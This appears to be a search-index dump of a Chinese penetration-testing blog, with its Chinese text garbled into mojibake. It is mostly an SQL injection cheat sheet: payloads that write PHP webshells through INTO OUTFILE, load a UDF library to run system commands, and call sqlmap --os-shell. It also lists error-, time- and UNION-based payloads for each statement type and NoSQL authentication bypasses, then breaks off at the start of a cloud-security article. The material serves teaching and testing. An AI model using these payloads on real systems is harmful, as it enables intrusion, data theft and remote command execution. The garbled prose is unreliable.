è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚lines starting by å¯ä»¥ç†è§£ä¸ºã€Œä»¥æ¯è¡Œå¼€å§‹çš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€ã€‚ åˆ©ç”¨ fields terminated by è¯­å¥æ‹¼æ¥webshellçš„å†…å®¹ã€‚fields terminated by å¯ä»¥ç†è§£ä¸ºã€Œä»¥æ¯ä¸ªå­—æ®µçš„ä½ç½®æ·»åŠ  xx å†…å®¹ã€ã€‚ // lines terminated by å†™å…¥ ?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines terminated by '\u003c?php phpinfo() ?\u003e'; // lines starting by å†™å…¥ ?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines starting by '\u003c?php phpinfo() ?\u003e'; // fields terminated by å†™å…¥ ?id=1 into outfile 'C:/wamp64/www/work/webshell.php' fields terminated by '\u003c?php phpinfo() ?\u003e'; // COLUMNS terminated by å†™å…¥ ?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' COLUMNS terminated by '\u003c?php phpinfo() ?\u003e'; ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:12:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"12.2 ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° - UDF è¿˜å¯ä»¥åˆ©ç”¨ã€Œç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€çš„æ–¹å¼ï¼Œå³ User Defined Functions(UDF) æ¥æ‰§è¡Œå‘½ä»¤ã€‚é€šè¿‡ lib_mysqludf_sys æä¾›çš„å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å…³é”®è¯­å¥: sys_eval()ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¹¶å°†è¾“å‡ºè¿”å› sys_exec()ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¹¶å°†è¿”å›ç è¿”å› sys_get()ï¼Œè·å–ä¸€ä¸ªç¯èŠ‚å˜é‡ sys_set()ï¼Œåˆ›å»ºæˆ–ä¿®æ”¹ä¸€ä¸ªç¯å¢ƒå˜é‡ 12.2.1 UDF åº“æ–‡ä»¶è·å– https://github.com/mysqludf/lib_mysqludf_sys sqlmap/data/udf/mysql/ sqlmap ä¸‹çš„æ–‡ä»¶ç»è¿‡ç¼–ç ï¼Œéœ€è¦ä½¿ç”¨ sqlmap/extra/cloak ç›®å½•ä¸‹çš„ cloak.py æ–‡ä»¶è¿›è¡Œè§£ç  # è§£ç æ–‡ä»¶ python cloak.py -d -i /path/to/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so 12.2.2 UDF åº“æ–‡ä»¶å†™å…¥ å°† so æ–‡ä»¶è½¬æˆ 16 è¿›åˆ¶ï¼Œä»¥ 16 è¿›åˆ¶ç¼–ç å½¢å¼å†™å…¥ select unhex('???') into dumpfile '/usr/lib/mysql/plugin/lib_linux.so' 12.2.3 dumpfile vs. outfile è‹¥æˆ‘ä»¬æƒ³æŠŠä¸€ä¸ªå¯æ‰§è¡Œ 2 è¿›åˆ¶æ–‡ä»¶ç”¨ into outfile å‡½æ•°å¯¼å‡ºäº‹å®ä¸Šå¯¼å‡ºåå°±ä¼šè¢«ç ´åã€‚ å› ä¸º into outfile å‡½æ•°ä¼šåœ¨è¡Œæœ«ç«¯å†™å…¥æ–°è¡Œï¼Œæ›´è‡´å‘½çš„æ˜¯ä¼šè½¬ä¹‰æ¢è¡Œç¬¦ï¼Œè¿™æ ·çš„è¯è¿™ä¸ª 2 è¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶å°±ä¼šè¢«ç ´åã€‚ è¿™æ—¶å€™æˆ‘ä»¬ç”¨ into dumpfile å°±èƒ½å¯¼å‡ºä¸€ä¸ªå®Œæ•´èƒ½æ‰§è¡Œçš„ 2 è¿›åˆ¶æ–‡ä»¶ into dumpfile å‡½æ•°ä¸å¯¹ä»»ä½•åˆ—æˆ–è¡Œè¿›è¡Œç»ˆæ­¢ï¼Œä¹Ÿä¸æ‰§è¡Œä»»ä½•è½¬ä¹‰å¤„ç†ã€‚ 12.2.4 è‡ªå®šä¹‰å‡½æ•° create function sys_eval returns string soname \"lib_linux.so\"; select sys_eval('ifconfig'); ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:12:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"12.3 è‡ªåŠ¨åŒ–å·¥å…· sqlmap -u \"url\" --os-shell sqlmap -u \"url\" --os-cmd=ifconfig ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:12:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"13 æ³¨å…¥æŠ€å·§ ä» SQL è¯­æ³•è§’åº¦ï¼Œä»ä¸åŒçš„æ³¨å…¥ç‚¹ä½ç½®è¯´æ˜ SQL æ³¨å…¥çš„æŠ€å·§ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"13.1 SELECT æ³¨å…¥ select è¯­å¥ç”¨äºæ•°æ®è¡¨è®°å½•çš„æŸ¥è¯¢ï¼Œå¸¸åœ¨ç•Œé¢å±•ç¤ºçš„è¿‡ç¨‹ä¸­ä½¿ç”¨ 13.1.1 æ³¨å…¥ç‚¹åœ¨ select_expr æºä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š \u003c?php $conn = mysqli_connect(\"127.0.0.1\", \"root\", \"root\", \"test\"); $res = mysqli_query($conn, \"SELECT ${_GET['id']}, content FROM wp_news\"); $row = mysqli_fetch_array($res); echo \"$row['title']\"; echo \"$row['content']\"; ?\u003e å¯ä»¥é‡‡å–æ—¶é—´ç›²æ³¨çš„æ–¹å¼ï¼Œä½†æ˜¯æ ¹æ® MySQL çš„è¯­æ³•ï¼Œæœ‰æ›´ä¼˜çš„è§£å†³æ–¹æ³•ï¼Œå³åˆ©ç”¨ AS åˆ«åçš„æ–¹æ³•ï¼Œç›´æ¥å°†æŸ¥è¯¢çš„ç»“æœæ˜¾ç¤ºåˆ°ç•Œé¢ä¸­ã€‚ payloadï¼š?id=(select pwd from wp_user as title) 13.1.2 æ³¨å…¥ç‚¹åœ¨ table_reference ä¸Šæ–‡çš„ SQL æŸ¥è¯¢è¯­å¥æ”¹ä¸ºï¼š$res = mysqli_query($conn, \"SELECT title FROM ${_GET['table']}\"); ä»ç„¶å¯ä»¥åˆ©ç”¨åˆ«åçš„æ–¹å¼ç›´æ¥å–å‡ºæ•°æ® select title from (select pwd AS title from wp_user)x æŠ€å·§ åœ¨ä¸çŸ¥è¡¨åçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å…ˆä» information_schema.tables ä¸­æŸ¥è¯¢è¡¨åã€‚ åœ¨ select_expr å’Œ table_reference çš„æ³¨å…¥ï¼Œå¦‚æœæ³¨å…¥çš„ç‚¹æœ‰åå¼•å·åŒ…è£¹ï¼Œé‚£ä¹ˆéœ€è¦å…ˆé—­åˆåå¼•å·ã€‚ 13.1.3 æ³¨å…¥ç‚¹åœ¨ WHERE æˆ– HAVING å SQL è¯­å¥ï¼š$res = mysqli_query($conn, \"SELECT title FROM wp_news WHERE id=${_GET[id]}\") å®æˆ˜ä¸­æœ€å¸¸é‡åˆ°çš„æƒ…å†µï¼Œè¦å…ˆåˆ¤æ–­æœ‰æ— å¼•å·åŒ…è£¹ï¼Œå†é—­åˆå‰é¢å¯èƒ½å­˜åœ¨çš„æ‹¬å·ï¼Œå³å¯è¿›è¡Œæ³¨å…¥æ¥è·å–æ•°æ®ã€‚æ³¨å…¥ç‚¹åœ¨ HAVING åçš„æƒ…å†µä¸ä¹‹ç›¸ä¼¼ã€‚ 13.1.4 æ³¨å…¥ç‚¹åœ¨ GROUP BY æˆ– ORDER BY å 13.1.4.1 åˆ©ç”¨æŠ¥é”™ select * from wp_user_ order by 1|updatexml(1,concat(0x7e,database(),0x7e),0) 1105 - XPATH syntax error: â€˜sectestâ€™, Time: 0.000000s 13.1.4.2 åˆ©ç”¨å»¶æ—¶ $res = mysqli_query($conn, \"SELECT title FROM wp_news GROUP BY ${_GET['title']}\"); ç»è¿‡æµ‹è¯•å¯ä»¥å‘ç°ï¼Œ?title=id desc,(if(1ï¼Œsleep(1),1)) ä¼šè®©é¡µé¢è¿Ÿ 1 ç§’ï¼Œäºæ˜¯å¯ä»¥åˆ©ç”¨æ—¶é—´æ³¨å…¥è·å–ç›¸å…³æ•°æ®ã€‚ è­¦å‘Š è¯¥æ–¹æ³•åªèƒ½ç”¨åœ¨ mysql 5 ä¸Šï¼Œmysql 8 ä¸Šå¤±æ•ˆã€‚ 13.1.4.3 åˆ©ç”¨ \u0026 | ^ ä½è¿ç®—ç¬¦è¿›è¡Œ order by // å¸ƒå°”å‹ç›²æ³¨ select * from wp_user_ order by id|(if(1,2,1)) //id å’Œ if è¿”å›çš„ç»“æœè¿›è¡ŒæŒ‰ä½ä¸è¿›è¡Œ order by æ ¹æ®æ—¶é—´åˆ¤æ–­ select * from wp_user_ order by 1|if(database() regexp \"sectest\",sleep(1),0) 13.1.4.4 åˆ©ç”¨æ‹¬å·é—­åˆè¿›è¡Œè”åˆæŸ¥è¯¢ å‰ææ˜¯å‰å¥æŸ¥è¯¢å¿…é¡»å¸¦æœ‰æ‹¬å·ã€‚ (select * from person order by 1) union (select 1,2,3) Demo https://chall.tasteless.eu/level1/index.php?dir=asc payload: ?dir=,3)union(select%201,flag%20from%20level1_flag)%23 13.1.5 æ³¨å…¥ç‚¹åœ¨ LIMIT å LIMIT åçš„æ³¨å…¥åˆ¤æ–­æ¯”è¾ƒç®€å•ï¼Œé€šè¿‡æ›´æ”¹æ•°å­—å¤§å°ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºæ›´å¤šæˆ–è€…æ›´å°‘çš„è®°å½•æ•°ã€‚ç”±äºè¯­æ³•é™åˆ¶ï¼Œå‰é¢çš„å­—ç¬¦æ³¨å…¥æ–¹å¼ä¸å¯è¡Œï¼ˆLIMIT ååªèƒ½æ˜¯æ•°å­—ï¼‰ï¼Œåœ¨æ•´ä¸ª SQL è¯­å¥æ²¡æœ‰ ORDER BY å…³é”®å­—çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ UNION æ³¨å…¥ã€‚ å¦å¤–ï¼Œå¯æ ¹æ® SELECT è¯­æ³•ï¼Œé€šè¿‡åŠ å…¥ PROCEDURE æ¥å°è¯•æ³¨å…¥ï¼Œè¿™ç±»è¯­å¥åªé€‚åˆ MySQL 5.6 å‰çš„ç‰ˆæœ¬ï¼Œ select id from wp_news limit 2 procedure analyse(extractvalue(1,concat(0x7e,version())),1) ä¹Ÿå¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨ procedure analyse((select extractvalue(1,concat(0x3a,(if(mid(version(),1,1) LIKE 5, BENCHMARK(500000, SHA(1)), 1))))),1) ä¹Ÿå¯ä»¥ç›´æ¥å†™æ–‡ä»¶ into outfile ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"13.2 INSERT æ³¨å…¥ é€šå¸¸ï¼Œæ³¨å…¥ä½äºå­—æ®µåæˆ–è€…å­—æ®µå€¼çš„åœ°æ–¹ï¼Œä¸”æ²¡æœ‰å›æ˜¾ä¿¡æ¯ 13.2.1 æ³¨å…¥ç‚¹ä½äº tbl_name å¦‚æœèƒ½å¤Ÿé€šè¿‡æ³¨é‡Šç¬¦æ³¨é‡Šåç»­è¯­å¥ï¼Œåˆ™å¯ç›´æ¥æ’å…¥ç‰¹å®šæ•°æ®åˆ°æƒ³è¦çš„è¡¨å†…ï¼Œå¦‚ç®¡ç†å‘˜è¡¨ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå¦‚ä¸‹ SQL è¯­å¥ï¼š $res = mysqli_query($conn, \"INSERT INTO {$_GET['table']} VALUES(2,2,2,2)\"); å¼€å‘è€…é¢„æƒ³çš„æ˜¯ï¼Œæ§åˆ¶ table çš„å€¼ä¸º wp_newsï¼Œä»è€Œæ’å…¥æ–°é—»è¡¨æ•°æ®ã€‚ç”±äºå¯ä»¥æ§åˆ¶è¡¨åï¼Œå¯ä»¥è®¿é—® ?table=wp_user values(2ï¼Œ'newadmin'ï¼Œ'newpass')%23ï¼Œç›´æ¥æ’å…¥ç®¡ç†å‘˜ã€‚ 13.2.2 æ³¨å…¥ç‚¹ä½äº VALUES 13.2.2.1 INSERT å»¶æ—¶ INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\",\"3\" and sleep(1)) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\",\"3\" \u0026 sleep(1)) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\",\"3\" | sleep(1)) 13.2.2.2 INSERT æŠ¥é”™ INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"or updatexml(1,concat(0x7e,DATABASE()),0),1) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"and updatexml(1,concat(0x7e,DATABASE()),0),1) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"\u0026updatexml(1,concat(0x7e,DATABASE()),0),1) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"|updatexml(1,concat(0x7e,DATABASE()),0),1) INSERT into wp_user_ (username,password,year) VALUES(\"test1\",\"122\"+updatexml(1,concat(0x7e,DATABASE()),0),1) result: 1105 - XPATH syntax error: â€˜~sectestâ€™, Time: 0.000000s Demo http://chall.tasteless.eu/level15/ payload insert into tables values ('\\',',(select flag from level15_flag))# ') name: \\ text: ,(select flag from level15_flag))# ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"13.3 UPDATE æ³¨å…¥ 13.3.1 UPDATE æŠ¥é”™ update wp_user_ set password=\"zxczxcxzc\"or updatexml(1,concat(0x7e,database()),1) where id=9 update wp_user_ set password=\"zxczxcxzc\"or(updatexml(1,concat(0x7e,database()),1)) where id=9 13.3.2 UPDATE å»¶æ—¶ update wp_user_ set password=\"2\" and sleep(1) where id=9 update wp_user_ set password=\"00000000\" and if((LENGTH(database())=8),sleep(1),0) where id=9 //passwordå¤„å¿…é¡»ä¸ºæ•°å­—å‹ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"13.4 DELETE æ³¨å…¥ 13.4.1 DELETE å»¶æ—¶ delete from wp_user_ where id=21 or/and(sleep(2)) delete from wp_user_ where id=21 and if((LENGTH(database()=7)),sleep(2),0) 13.4.2 DELETE æŠ¥é”™ delete from wp_user_ where id=21 and updatexml(1,concat(0x7e,database()),1) ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"13.5 DESCIBE æ³¨å…¥ {DESCRIBE | DESC} table_name [col_name | wild] DESCRIBE æä¾›æœ‰å…³ä¸€ä¸ªè¡¨çš„åˆ—ä¿¡æ¯ã€‚col_name å¯ä»¥æ˜¯ä¸€ä¸ªåˆ—åæˆ–æ˜¯ä¸€ä¸ªåŒ…å« SQL é€šé…ç¬¦å­—ç¬¦ %å’Œ _ çš„å­—ç¬¦ä¸²ã€‚ æºä»£ç ï¼š \u003c?php require(\"config.php\"); $table = $_GET['table']?$_GET['table']:\"test\"; $table = Filter($table); mysqli_query($mysqli,\"desc `secret_{$table}`\") or Hacker(); $sql = \"select 'flag{xxx}' from secret_{$table}\"; $ret = sql_query($sql); echo $ret[0]; ?\u003e desc å¯ä»¥æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œå¯ä»¥è¿‡æ‰ç¬¬ä¸€ä¸ªæ£€æµ‹ã€‚ åå¼•å·åœ¨ union select ä¸­å¯ä»¥å½“åšç©ºæ ¼ã€‚ payload: ?table=test`` union select database() limit 1 offset 1 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:13:5","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"14 NoSQL æ³¨å…¥ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:14:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"14.1 å®šä¹‰ æ³›æŒ‡éå…³ç³»å‹çš„æ•°æ®åº“ã€‚éšç€äº’è”ç½‘ web2.0 ç½‘ç«™çš„å…´èµ·ï¼Œåœ¨é«˜å¯ç”¨ï¼Œé«˜å¹¶å‘å‹åŠ›ä¸‹ï¼Œä¼ ç»Ÿæ•°æ®åº“å·²ç»ä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œç”¨äºè§£å†³å¤§æ•°æ®åº”ç”¨å’Œè¶…å¤§è§„æ¨¡æ•°æ®å­˜å‚¨çš„é—®é¢˜ã€‚ ä¸»è¦ä»£è¡¨ï¼šMongDBã€ Redisã€ Memcache ä»¥ MongDB ä¸ºä¾‹ï¼Œå®ƒæ˜¯ä¸€ä¸ªé¢å‘æ–‡æ¡£å­˜å‚¨çš„æ•°æ®åº“ï¼Œä»¥é”®å€¼å¯¹å½¢å¼å­˜åœ¨ { name: \"Geekby\", age: 26, status: \"A\", groups: [\"news\", \"sports\"] } ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:14:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"14.2 æ³¨å…¥åŸç†ä¸€ åŸºæœ¬è¯­æ³• æ³¨å…¥è¿‡ç¨‹ ä»¥ç”¨æˆ·èº«ä»½éªŒè¯ä¸ºä¾‹ï¼ŒPOST è¯·æ±‚ï¼š username=test\u0026password=123456 åç«¯ç¨‹åºè¯­è¨€ï¼Œæˆ‘ä»¬å¸Œæœ›æ˜¯è¿™æ ·çš„ï¼š db.users.find({username: 'test', password: '123456'}) å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹è¯·æ±‚ï¼š username[$ne]=1\u0026password[$ne]=1 å®é™…åç«¯ç¨‹åºè¿è¡Œï¼š db.logins.find({username:{$ne:1}, password:{$ne:1}}) ç±»æ¯”ä¼ ç»Ÿ SQL è¯­å¥ï¼š select * from logins where username \u003c\u003e 1 and password \u003c\u003e 1 ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:14:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"14.3 æ³¨å…¥åŸç†äºŒ å¦‚æœåœ¨ç¼–ç¨‹è¯­è¨€ä¸­ä¸å¤Ÿè°¨æ…ï¼Œä¹Ÿå¯èƒ½äº§ç”Ÿåƒ sqli æ³¨å…¥é‚£æ ·çš„æˆªæ–­é—®é¢˜ï¼Œä½†æ˜¯è¿™æ˜¯åœ¨ç¨‹åºè¯­è¨€ä¸­è€Œé SQL è¯­å¥ä¸­ï¼š $script= \"try{ var key = db.users.find({username: 'test'}).value; var inputValue = '\".$input.\"'; if(key == inputValue) { return('match'); }}\"; å½“è¾“å…¥ ';return key;// -\u003e var inputValue='';return key;//'ï¼Œå¯¼è‡´ inputValue ä¸ºç©ºï¼Œç›´æ¥è¿”å› key å­—æ®µ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:14:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å…¬æœ‰äº‘ä»‹ç»åŠç›¸å…³æ¼æ´åˆ©ç”¨æ–¹å¼","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å…¬æœ‰äº‘å®‰å…¨ ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:0:0","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 å‰è¨€ Tips äº‘ç§Ÿæˆ·å®‰å…¨ä¸åœ¨è®¨è®ºèŒƒå›´å†… äº‘åŸç”Ÿåº”ç”¨æ¼æ´ç•¥æœ‰æ¶‰åŠ å¾®æœåŠ¡ä¸åœ¨è®¨è®ºèŒƒå›´å†… äº‘å®‰å…¨é…ç½®é”™è¯¯ä»¥åŠä¸æ­£ç¡®çš„ã€Œæ¡ˆä¾‹ã€ç¤ºèŒƒæ˜¯å¯¼è‡´å®‰å…¨é—®é¢˜é¢‘å‘çš„é‡è¦åŸå›  ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:1:0","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.1 ä¸ºä»€ä¹ˆè¦ä¸Šäº‘ å®‰å…¨ä¼ ç»Ÿè¾¹ç•Œæ¨¡ç³Š all in cloud å…¬å¸è¶Šæ¥è¶Šå¤š ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:1:1","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.2 ç›¸å…³èµ„æ–™ https://aws.amazon.com/n/training/ https://edu.aliyun.com https://cloud.tencent.com/edu/training https://cloud.google.com/certification/ https://www.microsoft.com/zh-cn/learning/azure-training.aspx ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:1:2","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.3 å¸¸è§çš„äº‘äº§å“ ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:1:3","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 å¸¸è§æ¦‚å¿µ ","date":"2020-12-31","objectID":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/:2:0","tags":["æ¸—é€æµ‹è¯•","å…¬æœ‰äº‘"],"title":"å…¬æœ‰äº‘å®‰å…¨","uri":"/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 å…ƒæ•°æ® - metadata åœ¨äº‘è®¡ç®—ä¸­ï¼ŒMetadata å¹¶ä¸æ˜¯ä¸€ä¸ªé™Œç”Ÿçš„æ¦‚å¿µã€‚ä»å­—é¢ä¸Šçœ‹ï¼ŒMetadata æ˜¯å…ƒæ•°æ®çš„æ„æ€ã€‚è€Œåœ¨äº‘è®¡ç®—ä¸­ï¼ŒMetadata æœåŠ¡èƒ½å¤Ÿå‘è™šæœºæ³¨å…¥ä¸€äº›é¢å¤–çš„ä¿¡æ¯ï¼Œè¿™æ ·è™šæœºåœ¨åˆ›å»ºä¹‹åå¯ä»¥æœ‰ä¸€äº›å®šåˆ¶åŒ–çš„é…ç½®ã€‚åœ¨ OpenStack ä¸­ï¼ŒMetadata 